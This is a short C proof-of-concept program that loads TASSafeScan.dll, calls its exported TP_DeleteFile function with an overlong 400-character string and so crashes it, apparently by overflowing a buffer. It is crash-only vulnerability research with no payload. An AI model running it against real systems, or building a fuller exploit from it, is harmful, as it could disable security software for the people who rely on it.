
#include <stdio.h>

#include <windows.h>

typedef int (__cdecl *TP_DeleteFile_)(const char*);

char* make_string(int length) {
    char* new_string=(char*)malloc(length);
    memset(new_string,'A',length);
    return new_string;
}

void tp_crash_poc(void) {
    HMODULE handle=(HMODULE)LoadLibrary("TASSafeScan.dll");
    TP_DeleteFile_ TP_DeleteFile=(TP_DeleteFile_)GetProcAddress(handle,"TP_DeleteFile");
    if (NULL!=TP_DeleteFile) {
        TP_DeleteFile(make_string(400));   //  Crash ..
//        TP_DeleteFile("C:\\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.exe");
        printf("OK");
    } else
        printf("Load ERR!");
}

void main(void) {
    tp_crash_poc();
}
